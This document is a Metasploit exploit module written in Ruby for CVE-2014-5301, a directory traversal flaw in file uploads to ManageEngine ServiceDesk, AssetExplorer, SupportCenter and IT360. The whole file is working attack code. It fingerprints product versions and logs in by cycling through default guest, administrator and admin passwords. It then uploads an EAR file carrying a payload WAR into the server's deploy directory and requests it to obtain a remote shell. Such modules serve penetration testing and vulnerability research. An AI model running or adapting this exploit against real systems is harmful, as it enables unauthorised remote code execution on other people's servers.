# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;          => &#039;ManageEngine Multiple Products Authenticated File Upload&#039;,
      &#039;Description&#039;   => %q{
        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
        the upload does not handle correctly &#039;../&#039; sequences, which can be abused to write
        in the file system. Authentication is needed to exploit this vulnerability, but this module
        will attempt to login using the default credentials for the administrator and guest
        combo. For IT360 targets enter the RPORT of the ServiceDesk instance (usually 8400). All
        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been
        been tested successfully in Windows and Linux on several versions.
      },
      &#039;Author&#039;        =>
        [
          &#039;Pedro Ribeiro <pedrib[at]gmail.com>&#039; # Vulnerability Discovery and Metasploit module
        ],
      &#039;License&#039;       => MSF_LICENSE,
      &#039;References&#039;    =>
        [
          [&#039;CVE&#039;, &#039;2014-5301&#039;],
          [&#039;OSVDB&#039;, &#039;116733&#039;],
          [&#039;URL&#039;, &#039;https://raw.githubusercontent.com/pedrib/PoC/master/ManageEngine/me_sd_file_upload.txt&#039;],
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2015/Jan/5&#039;]
        ],
      &#039;DefaultOptions&#039; => { &#039;WfsDelay&#039; => 30 },
      &#039;Privileged&#039;     => false, # Privileged on Windows but not on Linux targets
      &#039;Platform&#039;       => &#039;java&#039;,
      &#039;Arch&#039;           => ARCH_JAVA,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ],
          [ &#039;ServiceDesk Plus v5-v7.1 < b7016/AssetExplorer v4/SupportCenter v5-v7.9&#039;,
            {
              &#039;attachment_path&#039; => &#039;/workorder/Attachment.jsp&#039;
            }
          ],
          [ &#039;ServiceDesk Plus/Plus MSP v7.1 >= b7016 - v9.0 < b9031/AssetExplorer v5-v6.1&#039;,
            {
              &#039;attachment_path&#039; => &#039;/common/FileAttachment.jsp&#039;
            }
          ],
          [ &#039;IT360 v8-v10.4&#039;,
            {
              &#039;attachment_path&#039; => &#039;/common/FileAttachment.jsp&#039;
            }
          ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Dec 15 2014&#039;))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new(&#039;JSESSIONID&#039;,
          [false, &#039;Pre-authenticated JSESSIONID cookie (non-IT360 targets)&#039;]),
        OptString.new(&#039;IAMAGENTTICKET&#039;,
          [false, &#039;Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)&#039;]),
        OptString.new(&#039;USERNAME&#039;,
          [true, &#039;The username to login as&#039;, &#039;guest&#039;]),
        OptString.new(&#039;PASSWORD&#039;,
          [true, &#039;Password for the specified username&#039;, &#039;guest&#039;]),
        OptString.new(&#039;DOMAIN_NAME&#039;,
          [false, &#039;Name of the domain to logon to&#039;])
      ], self.class)
  end


  def get_version
    res = send_request_cgi({
      &#039;uri&#039;    => &#039;/&#039;,
      &#039;method&#039; => &#039;GET&#039;
    })

    # Major version, minor version, build and product (sd = servicedesk; ae = assetexplorer; sc = supportcenterl; it = it360)
    version = [ 9999, 9999, 0, &#039;sd&#039; ]

    if res && res.code == 200
      if res.body.to_s =~ /ManageEngine ServiceDesk/
        if res.body.to_s =~ /&nbps;&nbps;\|&nbps;&nbps;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/
          output = $1
          version = [output[0].to_i, output[2].to_i, &#039;0&#039;, &#039;sd&#039;]
        end
        if res.body.to_s =~ /src=&#039;\/scripts\/Login\.js\?([0-9]+)&#039;><\/script>/     # newer builds
          version[2] = $1.to_i
        elsif res.body.to_s =~ /&#039;\/style\/style\.css&#039;, &#039;([0-9]+)&#039;\);<\/script>/   # older builds
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine AssetExplorer/
        if res.body.to_s =~ /ManageEngine AssetExplorer &nbps;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)/ ||
            res.body.to_s =~ /<div class="login-versioninfo">version&nbps;([0-9]{1}\.{1}[0-9]{1}\.?[0-9]*)<\/div>/
          output = $1
          version = [output[0].to_i, output[2].to_i, 0, &#039;ae&#039;]
        end
        if res.body.to_s =~ /src="\/scripts\/ClientLogger\.js\?([0-9]+)"><\/script>/
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /ManageEngine SupportCenter Plus/
        # All of the vulnerable sc installations are "old style", so we don&#039;t care about the major / minor version
        version[3] = &#039;sc&#039;
        if res.body.to_s =~ /&#039;\/style\/style\.css&#039;, &#039;([0-9]+)&#039;\);<\/script>/
          # ... but get the build number if we can find it
          version[2] = $1.to_i
        end
      elsif res.body.to_s =~ /\/console\/ConsoleMain\.cc/
        # IT360 newer versions
        version[3] = &#039;it&#039;
      end
    elsif res && res.code == 302 && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
      # IT360 older versions, not a very good detection string but there is no alternative?
      version[3] = &#039;it&#039;
    end

    version
  end


  def check
    version = get_version
    # TODO: put fixed version on the two ifs below once (if...) products are fixed
    # sd was fixed on build 9031
    # ae and sc still not fixed
    if (version[0] <= 9 && version[0] > 4 && version[2] < 9031 && version[3] == &#039;sd&#039;) ||
    (version[0] <= 6 && version[2] < 99999 && version[3] == &#039;ae&#039;) ||
    (version[3] == &#039;sc&#039; && version[2] < 99999)
      return Exploit::CheckCode::Appears
    end

    if (version[2] > 9030 && version[3] == &#039;sd&#039;) ||
        (version[2] > 99999 && version[3] == &#039;ae&#039;) ||
        (version[2] > 99999 && version[3] == &#039;sc&#039;)
      return Exploit::CheckCode::Safe
    else
      # An IT360 check always lands here, there is no way to get the version easily
      return Exploit::CheckCode::Unknown
    end
  end


  def authenticate_it360(port, path, username, password)
    if datastore[&#039;DOMAIN_NAME&#039;] == nil
      vars_post = {
        &#039;LOGIN_ID&#039; => username,
        &#039;PASSWORD&#039; => password,
        &#039;isADEnabled&#039; => &#039;false&#039;
      }
    else
      vars_post = {
        &#039;LOGIN_ID&#039; => username,
        &#039;PASSWORD&#039; => password,
        &#039;isADEnabled&#039; => &#039;true&#039;,
        &#039;domainName&#039; => datastore[&#039;DOMAIN_NAME&#039;]
      }
    end

    res = send_request_cgi({
      &#039;rport&#039;  => port,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(path),
      &#039;vars_get&#039; => {
        &#039;service&#039;   => &#039;ServiceDesk&#039;,
        &#039;furl&#039;      => &#039;/&#039;,
        &#039;timestamp&#039; => Time.now.to_i
      },
      &#039;vars_post&#039; => vars_post
    })

    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
      # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
      return res.get_cookies
    else
      return nil
    end
  end


  def get_it360_cookie_name
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri("/")
    })
    cookie = res.get_cookies
    if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
      return $1
    else
      return nil
    end
  end


  def login_it360
    # Do we already have a valid cookie? If yes, just return that.
    if datastore[&#039;IAMAGENTTICKET&#039;]
      cookie_name = get_it360_cookie_name
      cookie = &#039;IAMAGENTTICKET&#039; + cookie_name + &#039;=&#039; + datastore[&#039;IAMAGENTTICKET&#039;] + &#039;;&#039;
      return cookie
    end

    # get the correct path, host and port
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(&#039;/&#039;)
    })

    if res && res.redirect?
      uri = [ res.redirection.port, res.redirection.path ]
    else
      return nil
    end

    cookie = authenticate_it360(uri[0], uri[1], datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])

    if cookie != nil
      return cookie
    elsif datastore[&#039;USERNAME&#039;] == &#039;guest&#039; && datastore[&#039;JSESSIONID&#039;] == nil
      # we&#039;ve tried with the default guest password, now let&#039;s try with the default admin password
      cookie = authenticate_it360(uri[0], uri[1], &#039;administrator&#039;, &#039;administrator&#039;)
      if cookie != nil
        return cookie
      else
        # Try one more time with the default admin login for some versions
        cookie = authenticate_it360(uri[0], uri[1], &#039;admin&#039;, &#039;admin&#039;)
        if cookie != nil
          return cookie
        end
      end
    end

    nil
  end


  #
  # Authenticate and validate our session cookie. We need to submit credentials to
  # j_security_check and then follow the redirect to HomePage.do to create a valid
  # authenticated session.
  #
  def authenticate(cookie, username, password)
    res = send_request_cgi!({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(&#039;/j_security_check;&#039; + cookie.to_s.gsub(&#039;;&#039;, &#039;&#039;)),
      &#039;ctype&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;cookie&#039; => cookie,
      &#039;vars_post&#039; => {
        &#039;j_username&#039; => username,
        &#039;j_password&#039; => password,
        &#039;logonDomainName&#039; => datastore[&#039;DOMAIN_NAME&#039;]
      }
    })
    if res && (res.code == 302 || (res.code == 200 && res.body.to_s =~ /redirectTo="\+&#039;HomePage\.do&#039;;/))
      # sd and ae respond with 302 while sc responds with a 200
      return true
    else
      return false
    end
  end


  def login
    # Do we already have a valid cookie? If yes, just return that.
    if datastore[&#039;JSESSIONID&#039;] != nil
      cookie = &#039;JSESSIONID=&#039; + datastore[&#039;JSESSIONID&#039;].to_s + &#039;;&#039;
      return cookie
    end

    # First we get a valid JSESSIONID to pass to authenticate()
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(&#039;/&#039;)
    })
    if res && res.code == 200
      cookie = res.get_cookies
      authenticated = authenticate(cookie, datastore[&#039;USERNAME&#039;], datastore[&#039;PASSWORD&#039;])
      if authenticated
        return cookie
      elsif datastore[&#039;USERNAME&#039;] == &#039;guest&#039; && datastore[&#039;JSESSIONID&#039;] == nil
        # we&#039;ve tried with the default guest password, now let&#039;s try with the default admin password
        authenticated = authenticate(cookie, &#039;administrator&#039;, &#039;administrator&#039;)
        if authenticated
          return cookie
        else
          # Try one more time with the default admin login for some versions
          authenticated = authenticate(cookie, &#039;admin&#039;, &#039;admin&#039;)
          if authenticated
            return cookie
          end
        end
      end
    end

    nil
  end


  def send_multipart_request(cookie, payload_name, payload_str)
    if payload_name =~ /\.ear/
      upload_path = &#039;../../server/default/deploy&#039;
    else
      upload_path = rand_text_alpha(4+rand(4))
    end

    post_data = Rex::MIME::Message.new

    if @my_target == targets[1]
      # old style
      post_data.add_part(payload_str, &#039;application/octet-stream&#039;, &#039;binary&#039;, "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{payload_name}\"")
      post_data.add_part(payload_name, nil, nil, "form-data; name=\"filename\"")
      post_data.add_part(&#039;&#039;, nil, nil, "form-data; name=\"vecPath\"")
      post_data.add_part(&#039;&#039;, nil, nil, "form-data; name=\"vec\"")
      post_data.add_part(&#039;AttachFile&#039;, nil, nil, "form-data; name=\"theSubmit\"")
      post_data.add_part(&#039;WorkOrderForm&#039;, nil, nil, "form-data; name=\"formName\"")
      post_data.add_part(upload_path, nil, nil, "form-data; name=\"component\"")
      post_data.add_part(&#039;Attach&#039;, nil, nil, "form-data; name=\"ATTACH\"")
    else
      post_data.add_part(upload_path, nil, nil, "form-data; name=\"module\"")
      post_data.add_part(payload_str, &#039;application/octet-stream&#039;, &#039;binary&#039;, "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(4))}\"; filename=\"#{payload_name}\"")
      post_data.add_part(&#039;&#039;, nil, nil, "form-data; name=\"att_desc\"")
    end

    data = post_data.to_s
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(@my_target[&#039;attachment_path&#039;]),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
      &#039;cookie&#039; => cookie
    })
    return res
  end


  def pick_target
    return target if target.name != &#039;Automatic&#039;

    version = get_version
    if (version[0] <= 7 && version[2] < 7016 && version[3] == &#039;sd&#039;) ||
    (version[0] == 4 && version[3] == &#039;ae&#039;) ||
    (version[3] == &#039;sc&#039;)
      # These are all "old style" versions (sc is always old style)
      return targets[1]
    elsif version[3] == &#039;it&#039;
      return targets[3]
    else
      return targets[2]
    end
  end


  def exploit
    if check == Exploit::CheckCode::Safe
      fail_with(Failure::NotVulnerable, "#{peer} - Target not vulnerable")
    end

    print_status("#{peer} - Selecting target...")
    @my_target = pick_target
    print_status("#{peer} - Selected target #{@my_target.name}")

    if @my_target == targets[3]
      cookie = login_it360
    else
      cookie = login
    end

    if cookie.nil?
      fail_with(Exploit::Failure::Unknown, "#{peer} - Failed to authenticate")
    end

    # First we generate the WAR with the payload...
    war_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => war_app_base })

    # ... and then we create an EAR file that will contain it.
    ear_app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    app_xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
    app_xml << &#039;<application>&#039;
    app_xml << "<display-name>#{rand_text_alphanumeric(4 + rand(32 - 4))}</display-name>"
    app_xml << "<module><web><web-uri>#{war_app_base + ".war"}</web-uri>"
    app_xml << "<context-root>/#{ear_app_base}</context-root></web></module></application>"

    # in the Java vulnerable application
    ear_file = Rex::Zip::Archive.new(Rex::Zip::CM_STORE)
    ear_file.add_file(war_app_base + &#039;.war&#039;, war_payload.to_s)
    ear_file.add_file(&#039;META-INF/application.xml&#039;, app_xml)
    ear_file_name = rand_text_alphanumeric(4 + rand(32 - 4)) + &#039;.ear&#039;

    if @my_target != targets[3]
      # Linux doesn&#039;t like it when we traverse non existing directories,
      # so let&#039;s create them by sending some random data before the EAR.
      # (IT360 does not have a Linux version so we skip the bogus file for it)
      print_status("#{peer} - Uploading bogus file...")
      res = send_multipart_request(cookie, rand_text_alphanumeric(4 + rand(32 - 4)), rand_text_alphanumeric(4 + rand(32 - 4)))
      if res && res.code != 200
        fail_with(Exploit::Failure::Unknown, "#{peer} - Bogus file upload failed")
      end
    end

    # Now send the actual payload
    print_status("#{peer} - Uploading EAR file...")
    res = send_multipart_request(cookie, ear_file_name, ear_file.pack)
    if res && res.code == 200
      print_status("#{peer} - Upload appears to have been successful")
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - EAR upload failed")
    end

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi({
        &#039;uri&#039;    => normalize_uri(ear_app_base, war_app_base, Rex::Text.rand_text_alpha(rand(8)+8)),
        &#039;method&#039; => &#039;GET&#039;
      })
      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end
  end
end

